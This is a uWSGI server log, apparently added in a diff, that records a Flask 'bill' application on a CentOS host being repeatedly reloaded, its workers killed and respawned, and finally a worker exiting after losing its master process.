+uwsgi socket 0 bound to TCP address 127.0.0.1:36099 (port auto-assigned) fd 3
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x1241430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1241430 pid: 5158 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 5158)
+spawned uWSGI worker 1 (pid: 5239, cores: 1)
+spawned uWSGI http 1 (pid: 5240)
+Sat Jan 11 11:56:18 2020 - *** /home/python/flask/bill has been touched... grace them all !!! ***
+gateway "uWSGI http 1" has been buried (pid: 5240)
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 5239)...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (127.0.0.1:36099)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Jan 11 11:56:19 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:33223 (port auto-assigned) fd 4
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x2715430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x2715430 pid: 5158 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 5158)
+spawned uWSGI worker 1 (pid: 5248, cores: 1)
+spawned uWSGI http 1 (pid: 5249)
+Sat Jan 11 11:56:24 2020 - *** /home/python/flask/bill has been touched... grace them all !!! ***
+gateway "uWSGI http 1" has been buried (pid: 5249)
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 5248)...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 4 mapped to socket 0 (127.0.0.1:33223)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Jan 11 11:56:25 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:35399 (port auto-assigned) fd 3
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x1818430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1818430 pid: 5158 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 5158)
+spawned uWSGI worker 1 (pid: 5264, cores: 1)
+spawned uWSGI http 1 (pid: 5265)
+gateway "uWSGI http 1" has been buried (pid: 5265)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (127.0.0.1:35399)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Jan 11 11:56:33 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:36616 (port auto-assigned) fd 4
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x1dd3430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1dd3430 pid: 5158 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 5158)
+spawned uWSGI worker 1 (pid: 5275, cores: 1)
+spawned uWSGI http 1 (pid: 5276)
+Sat Jan 11 11:56:42 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
